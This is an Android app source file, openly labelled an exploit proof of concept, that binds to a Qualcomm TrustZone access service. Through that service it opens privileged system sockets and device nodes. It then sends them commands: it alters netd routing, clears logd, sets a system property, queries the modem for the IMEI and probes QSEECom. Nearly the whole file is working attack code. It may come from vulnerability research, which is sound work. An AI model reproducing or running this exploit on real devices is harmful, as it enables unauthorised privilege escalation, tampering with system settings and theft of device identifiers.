package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private static final int ERROR_UNAVAIL = -96;
    private static final int ERROR_BADOBJ = -92;
    private static final int ERROR_DEFUNCT = -90;
    private static final int ERROR_KMEM = -97;
    private static final int ERROR_MAXARGS = -94;
    private static final int ERROR_MAXDATA = -95;
    private static final int ERROR_NOSLOTS = -93;
    private static final int ERROR_REMOTE = -98;
    private static final int ERROR_ABORT = -91;

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private Object tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native String[] nativeListDir(String path);
    public static native String nativeReadFile(String path);
    public static native String nativeTestQSEECom();
    public static native String nativeTestFd(int fd);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            try {
                Class<?> stubClass = Class.forName("com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd$Stub");
                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
                tzService = asInterface.invoke(null, service);
                appendLog("[TZ] Service bound");
                updateStatus("Bound - starting exploit");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } catch (Exception e) {
                appendLog("[TZ] asInterface error: " + e.toString());
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== Advanced TZ POC ==========");

        appendLog("[*] Testing QSEECom vulnerability...");
        try {
            String qseeResult = nativeTestQSEECom();
            appendLog("[QSEECom] Result: " + qseeResult);
        } catch (Exception e) {
            appendLog("[QSEECom] Exception: " + e.getMessage());
        }

        String[] sockets = nativeListDir("/dev/socket");
        if (sockets == null) sockets = new String[0];
        appendLog("[*] Found " + sockets.length + " sockets");

        String[] knownTargets = {
                "/dev/socket/netd",
                "/dev/socket/dnsproxyd",
                "/dev/socket/fwmarkd",
                "/dev/socket/mdnsd",
                "/dev/socket/logd",
                "/dev/socket/property_service",
                "/dev/socket/vold",
                "/dev/socket/wpa_ctrl_0",
                "/dev/socket/rild",
                "/dev/socket/ppp",
                "/dev/socket/qmux_radio",
                "/dev/socket/qmux_audio",
                "/dev/socket/qmux_bluetooth",
                "/dev/socket/qmux_gps",
                "/dev/socket/tcm",
                "/dev/socket/location",
                "/dev/socket/zygote",
                "/dev/socket/adbd",
                "/dev/qseecom",
                "/dev/ion",
                "/dev/ashmem",
                "/dev/kgsl-3d0",
                "/dev/tty",
                "/dev/console",
                "/dev/null",
                "/data/local/tmp/test"
        };

        List<String> allTargets = new ArrayList<>();
        for (String s : knownTargets) allTargets.add(s);
        for (String s : sockets) {
            String full = "/dev/socket/" + s;
            if (!allTargets.contains(full)) allTargets.add(full);
        }

        for (String path : allTargets) {
            if (stopRequested.get()) break;
            appendLog("[+] Testing " + path);
            try {
                testSocket(path);
            } catch (Exception e) {
                appendLog("[!] Error testing " + path + ": " + e.getMessage());
            }
        }

        tryPropertySet();
        tryReadProcFd();

        appendLog("========== EXPLOIT COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private void testSocket(String path) {
        ParcelFileDescriptor pfd = null;
        try {
            int[] handle = new int[1];
            pfd = openSocket(path, handle);
            if (pfd == null) {
                appendLog("[ ] Failed to open " + path + " (handle=" + (handle.length>0?handle[0]:"null") + ")");
                return;
            }
            FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) {
                appendLog("[ ] Invalid FD for " + path);
                pfd.close();
                return;
            }
            appendLog("[+] Opened " + path + " (handle=" + handle[0] + ")");

    
            if (handle[0] < 0) {
                String errMsg = getErrorString(handle[0]);
                appendLog("[!] Service returned error: " + handle[0] + " (" + errMsg + ")");
                pfd.close();
                return;
            }

            String fdInfo = nativeTestFd(pfd.getFd());
            appendLog("[FD] " + fdInfo);

            if (path.startsWith("/dev/socket/")) {
                String base = new File(path).getName();
                switch (base) {
                    case "netd": testNetd(fd); break;
                    case "dnsproxyd": testDnsProxy(fd); break;
                    case "fwmarkd": testFwmarkd(fd); break;
                    case "mdnsd": testMdnsd(fd); break;
                    case "logd": testLogd(fd); break;
                    case "property_service": testPropertyService(fd); break;
                    case "wpa_ctrl_0": testWpaCtrl(fd); break;
                    case "rild": testRild(fd); break;
                    case "vold": testVold(fd); break;
                    default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n", "list\n", "dump\n"});
                }
            } else {
                InputStream is = new FileInputStream(fd);
                byte[] buf = new byte[64];
                int read = readBytes(is, buf, 64, 500);
                if (read > 0) {
                    appendLog("[DEV] Read " + read + " bytes from " + path + ": " + bytesToHex(buf, read));
                } else {
                    appendLog("[DEV] No data from " + path);
                }
                is.close();
            }
            pfd.close();
        } catch (Exception e) {
            appendLog("[!] Exception testing " + path + ": " + e.getMessage());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private String getErrorString(int code) {
        switch(code) {
            case ERROR_UNAVAIL: return "ERROR_UNAVAIL";
            case ERROR_BADOBJ: return "ERROR_BADOBJ";
            case ERROR_DEFUNCT: return "ERROR_DEFUNCT";
            case ERROR_KMEM: return "ERROR_KMEM";
            case ERROR_MAXARGS: return "ERROR_MAXARGS";
            case ERROR_MAXDATA: return "ERROR_MAXDATA";
            case ERROR_NOSLOTS: return "ERROR_NOSLOTS";
            case ERROR_REMOTE: return "ERROR_REMOTE";
            case ERROR_ABORT: return "ERROR_ABORT";
            default: return "UNKNOWN";
        }
    }

    private ParcelFileDescriptor openSocket(String path, int[] handle) {
        if (tzService == null) return null;
        try {
            Class<?> cls = tzService.getClass();
            Method m = cls.getMethod("a", String.class, int[].class);
            return (ParcelFileDescriptor) m.invoke(tzService, path, handle);
        } catch (Exception e) {
            appendLog("[!] openSocket exception: " + e.getMessage());
            return null;
        }
    }

    private void testNetd(FileDescriptor fd) {
        appendLog("[NETD] Testing netd commands");
        String[] cmds = {
                "help\n", "version\n", "interface list\n", "route list\n",
                "tether start 192.168.1.1 192.168.1.10\n",
                "dns resolver getservers\n",
                "dns resolver flushnet 0\n",
                "network create 101\n",
                "network interface add 101 wlan0\n",
                "network route add 101 wlan0 0.0.0.0/0 192.168.1.1\n",
                "network destroy 101\n",
                "ip rule show\n",
                "ip route show table all\n",
                "tether status\n"
        };
        for (String cmd : cmds) {
            if (stopRequested.get()) break;
            try {
                String resp = sendTextCommand(fd, cmd, 2000);
                appendLog("[NETD] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
            } catch (Exception e) {
                appendLog("[NETD] Error on cmd " + cmd.trim() + ": " + e.getMessage());
            }
        }
    }

    private void testDnsProxy(FileDescriptor fd) {
        appendLog("[DNS] Sending DNS query for localhost (A)");
        try {
            byte[] query = buildDnsQuery("localhost", 1);
            byte[] resp = sendBinary(fd, query, 512, 2000);
            if (resp != null && resp.length > 0) {
                int rcode = resp[3] & 0x0F;
                appendLog("[DNS] Response len=" + resp.length + ", RCODE=" + rcode);
            } else {
                appendLog("[DNS] No response");
            }
        } catch (Exception e) {
            appendLog("[DNS] Error: " + e.getMessage());
        }

        appendLog("[DNS] Sending DNS query for localhost (PTR)");
        try {
            byte[] query = buildDnsQuery("1.0.0.127.in-addr.arpa", 12);
            byte[] resp = sendBinary(fd, query, 512, 2000);
            if (resp != null && resp.length > 0) {
                int rcode = resp[3] & 0x0F;
                appendLog("[DNS] PTR response len=" + resp.length + ", RCODE=" + rcode);
            } else {
                appendLog("[DNS] No PTR response");
            }
        } catch (Exception e) {
            appendLog("[DNS] PTR error: " + e.getMessage());
        }

        appendLog("[DNS] Sending ANY query");
        try {
            byte[] query = buildDnsQuery("localhost", 255);
            byte[] resp = sendBinary(fd, query, 512, 2000);
            if (resp != null && resp.length > 0) {
                appendLog("[DNS] ANY response len=" + resp.length);
            } else {
                appendLog("[DNS] No ANY response");
            }
        } catch (Exception e) {
            appendLog("[DNS] ANY error: " + e.getMessage());
        }
    }

    private void testFwmarkd(FileDescriptor fd) {
        appendLog("[FW] Sending SELECT_NETWORK (cmd=6)");
        try {
            ByteBuffer buf = ByteBuffer.allocate(16);
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(6);
            buf.putInt(android.os.Process.myUid());
            buf.putInt(0);
            buf.putInt(0);
            byte[] resp = sendBinary(fd, buf.array(), 4, 1000);
            if (resp != null && resp.length == 4) {
                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
                appendLog("[FW] SELECT_NETWORK result=" + result);
            } else {
                appendLog("[FW] No/invalid response");
            }
        } catch (Exception e) {
            appendLog("[FW] Error: " + e.getMessage());
        }

        appendLog("[FW] Trying GET_NETWORK (cmd=7)");
        try {
            ByteBuffer buf = ByteBuffer.allocate(12);
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(7);
            buf.putInt(android.os.Process.myUid());
            buf.putInt(0);
            byte[] resp = sendBinary(fd, buf.array(), 8, 1000);
            if (resp != null && resp.length >= 4) {
                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
                appendLog("[FW] GET_NETWORK result=" + result);
            } else {
                appendLog("[FW] No response for GET_NETWORK");
            }
        } catch (Exception e) {
            appendLog("[FW] GET_NETWORK error: " + e.getMessage());
        }
    }

    private void testMdnsd(FileDescriptor fd) {
        appendLog("[MDNS] Sending mDNS query for localhost.local (A)");
        try {
            byte[] query = buildDnsQuery("localhost.local", 1);
            byte[] resp = sendBinary(fd, query, 512, 2000);
            if (resp != null && resp.length > 0) {
                appendLog("[MDNS] Response len=" + resp.length);
            } else {
                appendLog("[MDNS] No response");
            }
        } catch (Exception e) {
            appendLog("[MDNS] Error: " + e.getMessage());
        }

        appendLog("[MDNS] Sending mDNS PTR query for _services._dns-sd._udp.local");
        try {
            byte[] query = buildDnsQuery("_services._dns-sd._udp.local", 12);
            byte[] resp = sendBinary(fd, query, 512, 2000);
            if (resp != null && resp.length > 0) {
                appendLog("[MDNS] PTR response len=" + resp.length);
            } else {
                appendLog("[MDNS] No PTR response");
            }
        } catch (Exception e) {
            appendLog("[MDNS] PTR error: " + e.getMessage());
        }

        appendLog("[MDNS] Sending service query _http._tcp.local");
        try {
            byte[] query = buildDnsQuery("_http._tcp.local", 12);
            byte[] resp = sendBinary(fd, query, 512, 2000);
            if (resp != null && resp.length > 0) {
                appendLog("[MDNS] Service response len=" + resp.length);
            } else {
                appendLog("[MDNS] No service response");
            }
        } catch (Exception e) {
            appendLog("[MDNS] Service error: " + e.getMessage());
        }
    }

    private void testLogd(FileDescriptor fd) {
        appendLog("[LOGD] Reading logd (no command)");
        try {
            InputStream is = new FileInputStream(fd);
            byte[] buf = new byte[4096];
            int read = readBytes(is, buf, 4096, 1000);
            if (read > 0) {
                String str = new String(buf, 0, read, StandardCharsets.UTF_8);
                appendLog("[LOGD] Read " + read + " bytes: " + str.replace("\n", "\\n"));
            } else {
                appendLog("[LOGD] No data");
            }
            is.close();
        } catch (Exception e) {
            appendLog("[LOGD] Error: " + e.getMessage());
        }

        appendLog("[LOGD] Sending clear command");
        try {
            String resp = sendTextCommand(fd, "clear\n", 500);
            appendLog("[LOGD] clear response: " + (resp != null ? resp : "(none)"));
        } catch (Exception e) {
            appendLog("[LOGD] clear error: " + e.getMessage());
        }
    }

    private void testPropertyService(FileDescriptor fd) {
        appendLog("[PROP] Sending get commands");
        String[] props = {
                "ro.build.version.release", "ro.product.model", "ro.product.manufacturer",
                "persist.sys.timezone", "persist.sys.language", "sys.retaildemo.enabled",
                "ro.boot.hardware", "ro.boot.serialno"
        };
        for (String p : props) {
            if (stopRequested.get()) break;
            try {
                String cmd = "get " + p + "\n";
                String resp = sendTextCommand(fd, cmd, 500);
                appendLog("[PROP] " + p + " => " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
            } catch (Exception e) {
                appendLog("[PROP] Error getting " + p + ": " + e.getMessage());
            }
        }

        appendLog("[PROP] Trying list command");
        try {
            String resp = sendTextCommand(fd, "list\n", 500);
            appendLog("[PROP] list response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
        } catch (Exception e) {
            appendLog("[PROP] list error: " + e.getMessage());
        }
    }

    private void tryPropertySet() {
        try {
            int[] handle = new int[1];
            ParcelFileDescriptor pfd = openSocket("/dev/socket/property_service", handle);
            if (pfd == null) {
                appendLog("[PROP] Cannot open property_service");
                return;
            }
            FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) {
                appendLog("[PROP] Invalid FD");
                pfd.close();
                return;
            }
            String cmd = "set persist.test.poc 1\n";
            String resp = sendTextCommand(fd, cmd, 500);
            appendLog("[PROP] set command response: " + (resp != null ? resp : "(none)"));
            pfd.close();
        } catch (Exception e) {
            appendLog("[PROP] Exception: " + e.getMessage());
        }
    }

    private void testWpaCtrl(FileDescriptor fd) {
        appendLog("[WPA] Sending STATUS");
        try {
            String resp = sendTextCommand(fd, "STATUS\n", 1000);
            appendLog("[WPA] STATUS response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
        } catch (Exception e) {
            appendLog("[WPA] STATUS error: " + e.getMessage());
        }

        appendLog("[WPA] Sending LIST_NETWORKS");
        try {
            String resp = sendTextCommand(fd, "LIST_NETWORKS\n", 1000);
            appendLog("[WPA] LIST_NETWORKS response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
        } catch (Exception e) {
            appendLog("[WPA] LIST_NETWORKS error: " + e.getMessage());
        }

        appendLog("[WPA] Sending SCAN");
        try {
            String resp = sendTextCommand(fd, "SCAN\n", 1000);
            appendLog("[WPA] SCAN response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
        } catch (Exception e) {
            appendLog("[WPA] SCAN error: " + e.getMessage());
        }
    }

    private void testRild(FileDescriptor fd) {
        appendLog("[RILD] Sending AT+CGMI");
        try {
            byte[] at = "AT+CGMI\r\n".getBytes(StandardCharsets.UTF_8);
            byte[] resp = sendBinary(fd, at, 256, 1500);
            if (resp != null) {
                appendLog("[RILD] Response: " + new String(resp, StandardCharsets.UTF_8).replace("\n", "\\n"));
            } else {
                appendLog("[RILD] No response");
            }
        } catch (Exception e) {
            appendLog("[RILD] CGMI error: " + e.getMessage());
        }

        appendLog("[RILD] Sending AT+CGSN");
        try {
            byte[] at = "AT+CGSN\r\n".getBytes(StandardCharsets.UTF_8);
            byte[] resp = sendBinary(fd, at, 256, 1500);
            if (resp != null) {
                appendLog("[RILD] CGSN response: " + new String(resp, StandardCharsets.UTF_8).replace("\n", "\\n"));
            } else {
                appendLog("[RILD] No CGSN response");
            }
        } catch (Exception e) {
            appendLog("[RILD] CGSN error: " + e.getMessage());
        }

        appendLog("[RILD] Sending AT+COPS?");
        try {
            byte[] at = "AT+COPS?\r\n".getBytes(StandardCharsets.UTF_8);
            byte[] resp = sendBinary(fd, at, 256, 1500);
            if (resp != null) {
                appendLog("[RILD] COPS response: " + new String(resp, StandardCharsets.UTF_8).replace("\n", "\\n"));
            } else {
                appendLog("[RILD] No COPS response");
            }
        } catch (Exception e) {
            appendLog("[RILD] COPS error: " + e.getMessage());
        }
    }

    private void testVold(FileDescriptor fd) {
        appendLog("[VOLD] Sending status");
        try {
            String resp = sendTextCommand(fd, "status\n", 1000);
            appendLog("[VOLD] status response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
        } catch (Exception e) {
            appendLog("[VOLD] status error: " + e.getMessage());
        }

        appendLog("[VOLD] Sending list");
        try {
            String resp = sendTextCommand(fd, "list\n", 1000);
            appendLog("[VOLD] list response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
        } catch (Exception e) {
            appendLog("[VOLD] list error: " + e.getMessage());
        }

        appendLog("[VOLD] Sending dump");
        try {
            String resp = sendTextCommand(fd, "dump\n", 1000);
            appendLog("[VOLD] dump response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
        } catch (Exception e) {
            appendLog("[VOLD] dump error: " + e.getMessage());
        }
    }

    private void testGeneric(FileDescriptor fd, String[] cmds) {
        for (String cmd : cmds) {
            if (stopRequested.get()) break;
            try {
                String resp = sendTextCommand(fd, cmd, 1000);
                appendLog("[GEN] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
            } catch (Exception e) {
                appendLog("[GEN] Error on " + cmd.trim() + ": " + e.getMessage());
            }
        }
    }

    private void tryReadProcFd() {
        appendLog("[PROC] Reading /proc/self/fd");
        String[] fds = nativeListDir("/proc/self/fd");
        if (fds == null) {
            appendLog("[PROC] Could not read fd directory");
            return;
        }
        for (String fd : fds) {
            if (stopRequested.get()) break;
            String link = "/proc/self/fd/" + fd;
            try {
                String target = nativeReadFile(link);
                appendLog("[PROC] " + link + " -> " + (target != null ? target : "(unreadable)"));
            } catch (Exception e) {
                appendLog("[PROC] " + link + " error: " + e.getMessage());
            }
        }
    }

    private String sendTextCommand(FileDescriptor fd, String cmd, int timeoutMs) throws Exception {
        OutputStream os = null;
        InputStream is = null;
        try {
            os = new FileOutputStream(fd);
            os.write(cmd.getBytes(StandardCharsets.UTF_8));
            os.flush();
            os.close();
            os = null;

            is = new FileInputStream(fd);
            byte[] buf = new byte[4096];
            int read = readBytes(is, buf, 4096, timeoutMs);
            if (read > 0) {
                return new String(buf, 0, read, StandardCharsets.UTF_8);
            }
            return null;
        } finally {
            if (os != null) try { os.close(); } catch (Exception ignored) {}
            if (is != null) try { is.close(); } catch (Exception ignored) {}
        }
    }

    private byte[] sendBinary(FileDescriptor fd, byte[] data, int maxResp, int timeoutMs) throws Exception {
        OutputStream os = null;
        InputStream is = null;
        try {
            os = new FileOutputStream(fd);
            os.write(data);
            os.flush();
            os.close();
            os = null;

            is = new FileInputStream(fd);
            byte[] buf = new byte[maxResp];
            int read = readBytes(is, buf, maxResp, timeoutMs);
            if (read > 0) {
                byte[] resp = new byte[read];
                System.arraycopy(buf, 0, resp, 0, read);
                return resp;
            }
            return null;
        } finally {
            if (os != null) try { os.close(); } catch (Exception ignored) {}
            if (is != null) try { is.close(); } catch (Exception ignored) {}
        }
    }

    private int readBytes(InputStream is, byte[] buffer, int maxLen, int timeoutMs) {
        int total = 0;
        long start = System.currentTimeMillis();
        try {
            while (total < maxLen && System.currentTimeMillis() - start < timeoutMs) {
                if (is.available() > 0) {
                    int n = is.read(buffer, total, maxLen - total);
                    if (n <= 0) break;
                    total += n;
                } else {
                    Thread.sleep(20);
                }
            }
            return total;
        } catch (Exception e) {
            return -1;
        }
    }

    private byte[] buildDnsQuery(String name, int qtype) throws Exception {
        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
        baos.write(0x12); baos.write(0x34);
        baos.write(0x01); baos.write(0x00);
        baos.write(0x00); baos.write(0x01);
        baos.write(0x00); baos.write(0x00);
        baos.write(0x00); baos.write(0x00);
        baos.write(0x00); baos.write(0x00);
        for (String label : name.split("\\.")) {
            baos.write(label.length());
            baos.write(label.getBytes(StandardCharsets.US_ASCII));
        }
        baos.write(0);
        baos.write((qtype >> 8) & 0xFF); baos.write(qtype & 0xFF);
        baos.write(0x00); baos.write(0x01);
        return baos.toByteArray();
    }

    private String bytesToHex(byte[] bytes, int len) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < len && i < 64; i++) {
            sb.append(String.format("%02x ", bytes[i]));
        }
        if (len > 64) sb.append("...");
        return sb.toString();
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = null;
            if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
                dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            }
            if (dir == null || !dir.exists()) {
                if (dir != null && !dir.mkdirs()) {
                    appendLog("Cannot create Download dir, using internal storage");
                    dir = getFilesDir();
                } else if (dir == null) {
                    dir = getFilesDir();
                }
            }
            File file = new File(dir, "tz_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZ POC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Exploit completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
